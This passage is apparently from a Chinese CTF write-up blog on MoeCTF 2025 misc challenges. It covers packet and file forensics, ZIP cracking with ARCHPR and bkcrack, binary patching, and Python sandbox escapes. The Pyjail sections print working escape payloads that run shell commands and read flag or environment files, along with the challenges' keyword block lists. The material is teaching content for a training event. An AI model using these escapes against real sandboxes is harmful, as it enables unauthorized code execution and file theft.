class="language-none">moectf&#123;B1NwA1K_ANd_g1t_R3seT-MaG1C&#125;</code></pre><h2 id="ez_ssl">ez_ssl</h2><blockquote><p>zero6six在网页内上传了一份秘密文件。望着浏览器提示的“连接安全，信息不会外泄”，他觉得万无一失。</p><p>但与此同时，他的浏览器却悄悄上传了另一份文件。现在把他电脑的抓包记录给你，你能破解他的秘密吗？</p></blockquote><p>得到了一个<code>pngpca</code>文件，我们用<code>wireshark</code>工具作流量分析。题目提示有“秘密文件”和“另一份文件”，我们应该要把两个都找到。</p><p><code>http</code>过滤查看<code>post</code>方法上传的文件，发现是<code>ssl.log</code>日志文件；而<code>html</code>文件显示进行了文件上传操作。</p><p>查了一下和<code>TLS</code>有关，配置<code>ssl.log</code>文件后发现了<code>http</code>过滤后的信息变多，有一个<code>zip</code>文件，我们把文件导出，发现里面存在<code>flag.txt</code>。</p><p>然！后！我就一直以为<code>ssl.log</code>或者其他地方藏了密码，用各种方式去试都不行……最后发现压缩包写了密码是<code>7</code>位纯数字。用工具<code>ARCHPR</code>直接爆破。</p><p>得到密码：<code>6921682</code>，解压压缩包得到<code>Ook</code>编码，找个在线网站解码一下得到<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;upI0@d-l0G_TO-DeCrYPT_uploAD&#125;</code></pre><h2 id="ez_png">ez_png</h2><blockquote><p>这张平平无奇的图片里藏着一个小秘密。秘密不在颜色中，而在文件的骨骼里。注意：某些数据段的长短似乎不太协调。</p></blockquote><p>对于图片结构，我们可以使用工具<code>pngcheck</code>。</p><pre class="language-none"><code class="language-none">File: ez_png.png (899069 bytes)  chunk IHDR at offset 0x0000c, length 13    900 x 600 image, 24-bit RGB, non-interlaced  chunk pHYs at offset 0x00025, length 9: 2835x2835 pixels&#x2F;meter (72 dpi)  chunk IDAT at offset 0x0003a, length 65524    zlib: deflated, 32K window, default compression  chunk IDAT at offset 0x1003a, length 65524  chunk IDAT at offset 0x2003a, length 65524  chunk IDAT at offset 0x3003a, length 65524  chunk IDAT at offset 0x4003a, length 65524  chunk IDAT at offset 0x5003a, length 65524  chunk IDAT at offset 0x6003a, length 65524  chunk IDAT at offset 0x7003a, length 65524  chunk IDAT at offset 0x8003a, length 65524  chunk IDAT at offset 0x9003a, length 65524  chunk IDAT at offset 0xa003a, length 65524  chunk IDAT at offset 0xb003a, length 65524  chunk IDAT at offset 0xc003a, length 65524  chunk IDAT at offset 0xd003a, length 46973  chunk IDAT at offset 0xdb7c3, length 38  chunk IEND at offset 0xdb7f5, length 0No errors detected in ez_png.png (18 chunks, 44.5% compression).</code></pre><p>发现有数据块不正常，用<code>binwalk</code>检查一下，直接拆出来了<code>zlib</code>文件，点开就得到了<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;h1DdEn_P4YlOaD_IN-Id4T&#125;</code></pre><h2 id="万里挑一">万里挑一</h2><blockquote><p>要想冲破封锁，寻得真谛，须从万把钥匙中找出唯一的答案</p></blockquote><p>递归解压脚本，并把所有密码写入<code>txt</code>（最后手动处理一下多余的提示）。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> tempfile<span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">extract_zips</span><span class="token punctuation">(</span>zip_path<span class="token punctuation">,</span> output_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> tempfile<span class="token punctuation">.</span>TemporaryDirectory<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> temp_dir<span class="token punctuation">:</span>        <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>zip_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zip_ref<span class="token punctuation">:</span>            zip_ref<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>temp_dir<span class="token punctuation">)</span>            <span class="token keyword">for</span> item <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>temp_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>                item_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_dir<span class="token punctuation">,</span> item<span class="token punctuation">)</span>                <span class="token keyword">if</span> item<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>item_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>output_file<span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out_f<span class="token punctuation">:</span>                            out_f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>                <span class="token keyword">elif</span> item<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.zip'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    extract_zips<span class="token punctuation">(</span>item_path<span class="token punctuation">,</span> output_file<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    zip_path <span class="token operator">=</span> <span class="token string">"password.zip"</span>    output_file <span class="token operator">=</span> <span class="token string">"dic.txt"</span>    extract_zips<span class="token punctuation">(</span>zip_path<span class="token punctuation">,</span> output_file<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>然后用<code>ARCHPR</code>字典爆破，成功解压。</p><pre class="language-none"><code class="language-none">a296a5ec1385f394e8cb</code></pre><p>发现<code>明文.exe</code>和<code>flag.txt</code>，联想到<code>bkcrack</code>明文攻击（<a href="https://blog.csdn.net/qq_43007452/article/details/135607308">BugkuCTF：请攻击这个压缩包[WriteUP]-CSDN博客</a>）</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"4d5a90000300000004000000ffff"</span> <span class="token operator">|</span> xxd <span class="token parameter variable">-r</span> <span class="token parameter variable">-p</span> <span class="token operator">></span> plain.binbkcrack <span class="token parameter variable">-C</span> flag.zip <span class="token parameter variable">-c</span> <span class="token string">"明文.exe"</span> <span class="token parameter variable">-p</span> plain.bin <span class="token comment"># 得到key1 key2 key3</span>bkcrack <span class="token parameter variable">-C</span> flag.zip <span class="token parameter variable">-k</span> eec878a3 6808e48f 3aa41bd8 <span class="token parameter variable">-U</span> new_flag.zip <span class="token number">123456</span> <span class="token comment"># 用新密码解密</span></code></pre><pre class="language-none"><code class="language-none">moectf&#123;Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad&#125;</code></pre><h2 id="encrypted_volume">Encrypted_Volume</h2><blockquote><p>找到钥匙，解开加密卷！</p></blockquote><p>用<code>01editor</code>打开，在最后一个文件块中找到了<code>PNG</code>，保留这一部分发现二维码，扫描找到密钥。</p><pre class="language-none"><code class="language-none">:@(s&lt;&quot;A3F:89x541Ux[&lt;</code></pre><p>用<code>veracrypt</code>挂载<code>Volume</code>文件，得到了<code>brainfuck</code>加密文件，解密一下即可。</p><pre class="language-none"><code class="language-none">moectf&#123;nOW_YoU-h4V3_UNlocKED-VOlumE&#125;</code></pre><h2 id="哈基米难没露躲">哈基米难没露躲</h2><blockquote><p>出题人哈基米音乐听多了(bushi</p></blockquote><p>看了半天，符号和词都有规律，<code>100pts</code>不至于自己解吧？我去网上搜了搜哈基米加密，还真有。</p><p>简直就是世界上最优美的加密啊。</p><p>https://lhlnb.top/hajimi/base64</p><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc8.jpg"></p><p>提示隐写，发现有零宽字符，需要再解密。https://330k.github.io/misc_tools/unicode_steganography.html</p><pre class="language-none"><code class="language-none">moectf&#123;1b8956b9-a423-4101-a1bd-65be33682c82&#125;</code></pre><h2 id="master">2048_master</h2><blockquote><p>大家都是2048高手吧，出题人准备了一点小礼物哦，玩玩游戏就能拿到flag^ _^</p></blockquote><p>游戏玩了下玩不出来，所以我选择<code>reverse</code>。</p><p>思路：找到比较 <code>&gt; 13</code>的指令并修改成<code>&gt; 1</code>。</p><pre class="language-none"><code class="language-none">cmp eax, 0Dh # 改成01h</code></pre><p><code>IDA</code>中的操作是：1.修改：<code>Edit</code> →<code>Patch program</code> →<code>Assemble</code>，2.保存：<code>Edit</code> →<code>Patch program</code> →<code>Apply patches to input file</code>。运行修改后的<code>.exe</code>后就得到了<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;Y0u_4re_a_2048_m4st3r!!!!r0erowhu&#125;</code></pre><h2 id="pyjail-0">Pyjail 0</h2><blockquote><p>A simple reader <del>(所以严格来说这题不算 Pyjail)</del></p><p>关于验证码，示例：Please enter the reverse of ‘GZUUAOIS’ to continue:SIOAUUZG</p><p>至于 flag 的位置？你可以参考 Web 第十二章（</p></blockquote><p><code>Pyjail</code>沙箱逃逸笔记：https://xz.aliyun.com/news/12093</p><p>想起了那个把我恶心坏的<code>web</code>第十二章了，在虚拟环境里。</p><p>文件路径：<code>/proc/self/environ</code>。</p><p>接下来我都在<code>windows</code>上用<code>netcat</code>连接，格式为<code>netcat localhost &lt;port&gt;</code>。</p><p>此题输入反转字符串和文件地址即得到：</p><pre class="language-none"><code class="language-none">moectf&#123;07a71386-d189-c798-f194-04229b0b07e7&#125;</code></pre><h2 id="pyjail-1">Pyjail 1</h2><blockquote><p>flag 位置在 /tmp 下</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">chall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_input <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Give me your code: "</span><span class="token punctuation">)</span>    <span class="token comment"># 过滤关键字</span>    forbidden_keywords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> keyword <span class="token keyword">in</span> forbidden_keywords<span class="token punctuation">:</span>        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> user_input<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Forbidden keyword detected: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>keyword<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span></code></pre><p>我们可以用<strong>字节数组或字符编码</strong>来构造字符串，避免直接写<code>import</code>，想要执行如下代码我们可以改写：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'__import__'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat /tmp/flag.txt'</span><span class="token punctuation">)</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat /tmp/flag.txt'</span><span class="token punctuation">)</span></code></pre><pre class="language-none"><code class="language-none">moectf&#123;77553abb-2b7a-2c71-1870-4c41d9778a64&#125;</code></pre><h2 id="pyjail-2">Pyjail 2</h2><blockquote><p>flag 位置在 /tmp 下</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">chall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_input <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Give me your code: "</span><span class="token punctuation">)</span>    <span class="token comment"># 过滤关键字</span>    forbidden_keywords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> keyword <span class="token keyword">in</span> forbidden_keywords<span class="token punctuation">:</span>        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> user_input<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Forbidden keyword detected: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>keyword<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token comment"># 过滤特殊字符</span>    forbidden_chars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> forbidden_chars<span class="token punctuation">:</span>        <span class="token keyword">if</span> char <span class="token keyword">in</span> user_input<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Forbidden character detected: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>char<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span>    result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span></code></pre><p><strong>1. 使用<code>chr()</code>编码绕过字符过滤</strong></p><p>所有被禁止的字符（如<code>_</code>）和关键字都用<code>chr(ASCII码)</code>表示。</p><p><strong>2. 使用<code>getattr()</code>进行属性访问</strong></p><p>由于<code>.</code>被禁止，使用<code>getattr(object, attribute)</code>来访问属性。</p><p><strong>3.使用<code>globals()</code>和<code>__getitem__()</code>访问字典</strong></p><p>由于<code>[]</code>被禁止，使用：<code>dict[key]</code> →<code>dict.__getitem__(key)</code> →<code>getattr(dict, '__getitem__')(key)</code>。</p><pre class="language-none"><code class="language-none">__import__(&#39;os&#39;).system(&#39;cat &#x2F;tmp&#x2F;flag.txt&#39;)getattr(    getattr(        getattr(            getattr(                globals(),                &#39;__getitem__&#39;            )(&#39;__builtins__&#39;),            &#39;__dict__&#39;,            getattr(                globals(),                &#39;__getitem__&#39;            )(&#39;__builtins__&#39;)        ),        &#39;__getitem__&#39;    )(&#39;__import__&#39;)(&#39;os&#39;),    &#39;system&#39;)(&#39;cat &#x2F;tmp&#x2F;flag.txt&#39;)getattr(getattr(getattr(getattr(globals(), chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)), chr(95)+chr(95)+chr(100)+chr(105)+chr(99)+chr(116)+chr(95)+chr(95), getattr(globals(), chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95))), chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))(chr(111)+chr(115)), chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116))</code></pre><pre class="language-none"><code class="language-none">moectf&#123;59042fef-1e84-9185-fcbc-50168d5e02ba&#125;</code></pre><h2 id="pyjail-3">Pyjail 3</h2><blockquote><p>flag 位置在 /tmp 下</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">chall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_input <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Give me your code: "</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>user_input<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token comment"># Hint: When __builtins__ is None, you need to be more creative...</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Code executed successfully!"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Return value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Execution error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">type</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre><p>即使 <code>__builtins__</code>被禁用，仍然可以通过<strong>对象继承链</strong>或<strong>现有类的属性</strong>来重新获取内置函数。例如：</p><ul><li>通过元类（如 <code>().__class__.__mro__</code>）找到基类（如<code>object</code>）。</li><li>遍历子类（如 <code>__subclasses__()</code>）来寻找可用的类（如<code>os._wrap_close</code>、<code>ModuleSpec</code> 等）。</li><li>通过这些类的 <code>__init__.__globals__</code> 或<code>__builtins__</code> 属性重新获取内置函数。</li></ul><pre class="language-none"><code class="language-none">([c for c in ().__class__.__mro__[-1].__subclasses__() if c.__name__&#x3D;&#x3D;&#39;ModuleSpec&#39;][0].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;tmp&#x2F;flag.txt&#39;).read())</code></pre><pre class="language-none"><code class="language-none">moectf&#123;6486e9b8-47b8-0b5e-dead-8e554dd2a1b6&#125;</code></pre><h2 id="pyjail4">Pyjail4</h2><blockquote><p>flag 位置在 /tmp 下</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ast<span class="token keyword">import</span> base64<span class="token comment"># 自定义 AST 节点访问器来限制可用的语法结构</span><span class="token keyword">class</span> <span class="token class-name">RestrictedNodeVisitor</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>NodeVisitor<span class="token punctuation">)</span><span class="token punctuation">:</span>    forbidden_attrs <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"__class__"</span><span class="token punctuation">,</span> <span class="token string">"__dict__"</span><span class="token punctuation">,</span> <span class="token string">"__bases__"</span><span class="token punctuation">,</span> <span class="token string">"__mro__"</span><span class="token punctuation">,</span> <span class="token string">"__subclasses__"</span><span class="token punctuation">,</span>        <span class="token string">"__globals__"</span><span class="token punctuation">,</span> <span class="token string">"__code__"</span><span class="token punctuation">,</span> <span class="token string">"__closure__"</span><span class="token punctuation">,</span> <span class="token string">"__func__"</span><span class="token punctuation">,</span> <span class="token string">"__self__"</span><span class="token punctuation">,</span>        <span class="token string">"__module__"</span><span class="token punctuation">,</span> <span class="token string">"__import__"</span><span class="token punctuation">,</span> <span class="token string">"__builtins__"</span><span class="token punctuation">,</span> <span class="token string">"__base__"</span><span class="token punctuation">,</span> <span class="token string">"__init__"</span><span class="token punctuation">,</span> <span class="token string">"__getattribute__"</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">def</span> <span class="token function">visit_Attribute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 禁止危险属性访问</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>attr<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token keyword">and</span> node<span class="token punctuation">.</span>attr <span class="token keyword">in</span> self<span class="token punctuation">.</span>forbidden_attrs<span class="token punctuation">:</span>            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Access to attribute '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>node<span class="token punctuation">.</span>attr<span class="token punctuation">&#125;</span></span><span class="token string">' is forbidden!"</span></span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>generic_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">chall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_input <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Give me your code after base64 encoding it: "</span><span class="token punctuation">)</span>    code <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>user_input<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> user_input<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Empty input!"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># 使用 AST 解析和验证代码</span>        tree <span class="token operator">=</span> ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>code<span class="token punctuation">)</span>        visitor <span class="token operator">=</span> RestrictedNodeVisitor<span class="token punctuation">(</span><span class="token punctuation">)</span>        visitor<span class="token punctuation">.</span>visit<span class="token punctuation">(</span>tree<span class="token punctuation">)</span>                <span class="token comment"># 创建受限的执行环境</span>        safe_builtins <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"print"</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">,</span>            <span class="token string">"filter"</span><span class="token punctuation">:</span> <span class="token builtin">filter</span><span class="token punctuation">,</span>            <span class="token string">"list"</span><span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">,</span>            <span class="token string">"len"</span><span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">,</span>            <span class="token string">"Exception"</span><span class="token punctuation">:</span> Exception        <span class="token punctuation">&#125;</span>        safe_globals <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> safe_builtins<span class="token punctuation">&#125;</span>                <span class="token comment"># 执行用户代码</span>        <span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> safe_globals<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Code executed successfully!"</span><span class="token punctuation">)</span>                <span class="token keyword">except</span> SyntaxError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Syntax Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">except</span> RuntimeError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Runtime Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Execution Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">type</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre><p><strong>在Python中，栈帧（StackFrame）是解释器用于管理函数调用的一种内部数据结构。每当一个函数被调用时，Python就会创建一个栈帧对象，其中包含了该函数执行所需的“上下文”，例如局部变量、传入的参数以及当前指令的位置（返回地址）。</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64code <span class="token operator">=</span> <span class="token triple-quoted-string string">"""try:    raise Exception()except Exception as e:    frame = e.__traceback__.tb_frame.f_back    builtins = frame.f_globals['__builtins__']    print(builtins.open('/tmp/flag.txt').read())"""</span>encoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>code<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span>dHJ5OgogICAgcmFpc2UgRXhjZXB0aW9uKCkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgZnJhbWUgPSBlLl9fdHJhY2ViYWNrX18udGJfZnJhbWUuZl9iYWNrCiAgICBidWlsdGlucyA9IGZyYW1lLmZfZ2xvYmFsc1snX19idWlsdGluc19fJ10KICAgIHByaW50KGJ1aWx0aW5zLm9wZW4oJy90bXAvZmxhZy50eHQnKS5yZWFkKCkp</code></pre><pre class="language-none"><code class="language-none">moectf&#123;8e6909e8-7b9b-1c08-3131-46859e6830d9&#125;</code></pre><h2 id="moectf指导版">MoeCTF指导版</h2><blockquote><p>最近锤子太多了，都忙不过来了！！为了帮助大家更好地可以完成题目，fifker找到了一个好帮手…它可能有点…（？</p><p>耄耋：拿到flag的方法都告诉你了，你二朵隆吗？？（哈</p><p>（这只是一个游戏，没有任何web知识点考察，也不需要任何web手段，千万不要使用，否则会影响游戏体验）</p><p>（游戏加载需要一定时间）</p></blockquote><p>查看源代码有助于做题。</p><p><strong>第一关</strong>：精准投喂<code>25</code>个小鱼干，不然会触发<code>114514</code></p><p><strong>第二关</strong>：找信息即可<code>241410173</code>和<code>241410156</code></p><p><strong>第三关</strong>：文字游戏，密码分别是<code>password</code>和<code>incorrect!</code></p><p><strong>第四关</strong>：复制发现隐藏的密钥<code>xbhiuebkjvs</code></p><p><strong>第五关</strong>：翻转后点击<code>flag</code>按钮凸了</p><pre class="language-none"><code 